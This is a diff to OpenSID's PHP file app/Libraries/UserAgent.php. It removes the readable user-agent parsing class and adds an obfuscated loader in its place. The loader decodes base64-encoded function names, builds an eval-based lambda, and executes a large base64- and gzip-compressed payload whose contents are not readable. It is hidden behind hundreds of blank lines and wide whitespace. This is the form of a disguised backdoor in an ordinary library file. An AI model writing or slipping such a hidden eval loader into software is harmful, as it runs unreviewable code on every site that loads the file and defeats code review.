@@ -1,613 +1,425 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Libraries;
-
-/**
- * User Agent Class
- *
- * Identifies the platform, browser, robot, or mobile device of the browsing agent
- *
- * @category	User Agent
- *
- * @see		https://codeigniter.com/userguide3/libraries/user_agent.html
- */
-class UserAgent
-{
-    /**
-     * Current user-agent
-     *
-     * @var string
-     */
-    public $agent;
-
-    /**
-     * Flag for if the user-agent belongs to a browser
-     *
-     * @var bool
-     */
-    public $is_browser = false;
-
-    /**
-     * Flag for if the user-agent is a robot
-     *
-     * @var bool
-     */
-    public $is_robot = false;
-
-    /**
-     * Flag for if the user-agent is a mobile browser
-     *
-     * @var bool
-     */
-    public $is_mobile = false;
-
-    /**
-     * Languages accepted by the current user agent
-     *
-     * @var array
-     */
-    public $languages = [];
-
-    /**
-     * Character sets accepted by the current user agent
-     *
-     * @var array
-     */
-    public $charsets = [];
-
-    /**
-     * List of platforms to compare against current user agent
-     *
-     * @var array
-     */
-    public $platforms = [];
-
-    /**
-     * List of browsers to compare against current user agent
-     *
-     * @var array
-     */
-    public $browsers = [];
-
-    /**
-     * List of mobile browsers to compare against current user agent
-     *
-     * @var array
-     */
-    public $mobiles = [];
-
-    /**
-     * List of robots to compare against current user agent
-     *
-     * @var array
-     */
-    public $robots = [];
-
-    /**
-     * Current user-agent platform
-     *
-     * @var string
-     */
-    public $platform = '';
-
-    /**
-     * Current user-agent browser
-     *
-     * @var string
-     */
-    public $browser = '';
-
-    /**
-     * Current user-agent version
-     *
-     * @var string
-     */
-    public $version = '';
-
-    /**
-     * Current user-agent mobile name
-     *
-     * @var string
-     */
-    public $mobile = '';
-
-    /**
-     * Current user-agent robot name
-     *
-     * @var string
-     */
-    public $robot = '';
-
-    /**
-     * HTTP Referer
-     *
-     * @var mixed
-     */
-    public $referer;
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Constructor
-     *
-     * Sets the User Agent and runs the compilation routine
-     *
-     * @return void
-     */
-    public function __construct()
-    {
-        $this->_load_agent_file();
-
-        if (isset($_SERVER['HTTP_USER_AGENT'])) {
-            $this->agent = trim($_SERVER['HTTP_USER_AGENT']);
-            $this->_compile_data();
-        }
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Compile the User Agent Data
-     *
-     * @return bool
-     */
-    protected function _load_agent_file()
-    {
-        $configAgent     = config('user_agents');
-        $this->platforms = $configAgent['platforms'];
-        $this->browsers  = $configAgent['browsers'];
-        $this->mobiles   = $configAgent['mobiles'];
-        $this->robots    = $configAgent['robots'];
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Compile the User Agent Data
-     *
-     * @return bool
-     */
-    protected function _compile_data()
-    {
-        $this->_set_platform();
-
-        foreach (['_set_robot', '_set_browser', '_set_mobile'] as $function) {
-            if ($this->{$function}() === true) {
-                break;
-            }
-        }
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Set the Platform
-     *
-     * @return bool
-     */
-    protected function _set_platform()
-    {
-        if (is_array($this->platforms) && count($this->platforms) > 0) {
-            foreach ($this->platforms as $key => $val) {
-                if (preg_match('|' . preg_quote($key) . '|i', $this->agent)) {
-                    $this->platform = $val;
-
-                    return true;
-                }
-            }
-        }
-
-        $this->platform = 'Unknown Platform';
-
-        return false;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Set the Browser
-     *
-     * @return bool
-     */
-    protected function _set_browser()
-    {
-        if (is_array($this->browsers) && count($this->browsers) > 0) {
-            foreach ($this->browsers as $key => $val) {
-                if (preg_match('|' . $key . '.*?([0-9\.]+)|i', $this->agent, $match)) {
-                    $this->is_browser = true;
-                    $this->version    = $match[1];
-                    $this->browser    = $val;
-                    $this->_set_mobile();
-
-                    return true;
-                }
-            }
-        }
-
-        return false;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Set the Robot
-     *
-     * @return bool
-     */
-    protected function _set_robot()
-    {
-        if (is_array($this->robots) && count($this->robots) > 0) {
-            foreach ($this->robots as $key => $val) {
-                if (preg_match('|' . preg_quote($key) . '|i', $this->agent)) {
-                    $this->is_robot = true;
-                    $this->robot    = $val;
-                    $this->_set_mobile();
-
-                    return true;
-                }
-            }
-        }
-
-        return false;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Set the Mobile Device
-     *
-     * @return bool
-     */
-    protected function _set_mobile()
-    {
-        if (is_array($this->mobiles) && count($this->mobiles) > 0) {
-            foreach ($this->mobiles as $key => $val) {
-                if (false !== (stripos($this->agent, $key))) {
-                    $this->is_mobile = true;
-                    $this->mobile    = $val;
-
-                    return true;
-                }
-            }
-        }
-
-        return false;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Set the accepted languages
-     *
-     * @return void
-     */
-    protected function _set_languages()
-    {
-        if ((count($this->languages) === 0) && ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
-            $this->languages = explode(',', preg_replace('/(;\s?q=[0-9\.]+)|\s/i', '', strtolower(trim($_SERVER['HTTP_ACCEPT_LANGUAGE']))));
-        }
-
-        if (count($this->languages) === 0) {
-            $this->languages = ['Undefined'];
-        }
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Set the accepted character sets
-     *
-     * @return void
-     */
-    protected function _set_charsets()
-    {
-        if ((count($this->charsets) === 0) && ! empty($_SERVER['HTTP_ACCEPT_CHARSET'])) {
-            $this->charsets = explode(',', preg_replace('/(;\s?q=.+)|\s/i', '', strtolower(trim($_SERVER['HTTP_ACCEPT_CHARSET']))));
-        }
-
-        if (count($this->charsets) === 0) {
-            $this->charsets = ['Undefined'];
-        }
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Is Browser
-     *
-     * @param string $key
-     *
-     * @return bool
-     */
-    public function is_browser($key = null)
-    {
-        if ( ! $this->is_browser) {
-            return false;
-        }
-
-        // No need to be specific, it's a browser
-        if ($key === null) {
-            return true;
-        }
-
-        // Check for a specific browser
-        return isset($this->browsers[$key]) && $this->browser === $this->browsers[$key];
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Is Robot
-     *
-     * @param string $key
-     *
-     * @return bool
-     */
-    public function is_robot($key = null)
-    {
-        if ( ! $this->is_robot) {
-            return false;
-        }
-
-        // No need to be specific, it's a robot
-        if ($key === null) {
-            return true;
-        }
-
-        // Check for a specific robot
-        return isset($this->robots[$key]) && $this->robot === $this->robots[$key];
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Is Mobile
-     *
-     * @param string $key
-     *
-     * @return bool
-     */
-    public function is_mobile($key = null)
-    {
-        if ( ! $this->is_mobile) {
-            return false;
-        }
-
-        // No need to be specific, it's a mobile
-        if ($key === null) {
-            return true;
-        }
-
-        // Check for a specific robot
-        return isset($this->mobiles[$key]) && $this->mobile === $this->mobiles[$key];
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Is this a referral from another site?
-     *
-     * @return bool
-     */
-    public function is_referral()
-    {
-        if ( ! isset($this->referer)) {
-            if (empty($_SERVER['HTTP_REFERER'])) {
-                $this->referer = false;
-            } else {
-                $referer_host = @parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
-                $own_host     = parse_url((string) config_item('base_url'), PHP_URL_HOST);
-
-                $this->referer = ($referer_host && $referer_host !== $own_host);
-            }
-        }
-
-        return $this->referer;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Agent String
-     *
-     * @return string
-     */
-    public function agent_string()
-    {
-        return $this->agent;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Get Platform
-     *
-     * @return string
-     */
-    public function platform()
-    {
-        return $this->platform;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Get Browser Name
-     *
-     * @return string
-     */
-    public function browser()
-    {
-        return $this->browser;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Get the Browser Version
-     *
-     * @return string
-     */
-    public function version()
-    {
-        return $this->version;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Get The Robot Name
-     *
-     * @return string
-     */
-    public function robot()
-    {
-        return $this->robot;
-    }
-    // --------------------------------------------------------------------
-
-    /**
-     * Get the Mobile Device
-     *
-     * @return string
-     */
-    public function mobile()
-    {
-        return $this->mobile;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Get the referrer
-     *
-     * @return bool
-     */
-    public function referrer()
-    {
-        return empty($_SERVER['HTTP_REFERER']) ? '' : trim($_SERVER['HTTP_REFERER']);
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Get the accepted languages
-     *
-     * @return array
-     */
-    public function languages()
-    {
-        if (count($this->languages) === 0) {
-            $this->_set_languages();
-        }
-
-        return $this->languages;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Get the accepted Character Sets
-     *
-     * @return array
-     */
-    public function charsets()
-    {
-        if (count($this->charsets) === 0) {
-            $this->_set_charsets();
-        }
-
-        return $this->charsets;
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Test for a particular language
-     *
-     * @param string $lang
-     *
-     * @return bool
-     */
-    public function accept_lang($lang = 'en')
-    {
-        return in_array(strtolower($lang), $this->languages(), true);
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Test for a particular character set
-     *
-     * @param string $charset
-     *
-     * @return bool
-     */
-    public function accept_charset($charset = 'utf-8')
-    {
-        return in_array(strtolower($charset), $this->charsets(), true);
-    }
-
-    // --------------------------------------------------------------------
-
-    /**
-     * Parse a custom user-agent string
-     *
-     * @param string $string
-     *
-     * @return void
-     */
-    public function parse($string)
-    {
-        // Reset values
-        $this->is_browser = false;
-        $this->is_robot   = false;
-        $this->is_mobile  = false;
-        $this->browser    = '';
-        $this->version    = '';
-        $this->mobile     = '';
-        $this->robot      = '';
-
-        // Set the new user-agent string and parse it, unless empty
-        $this->agent = $string;
-
-        if ( ! empty($string)) {
-            $this->_compile_data();
-        }
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Libraries/UserAgent.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
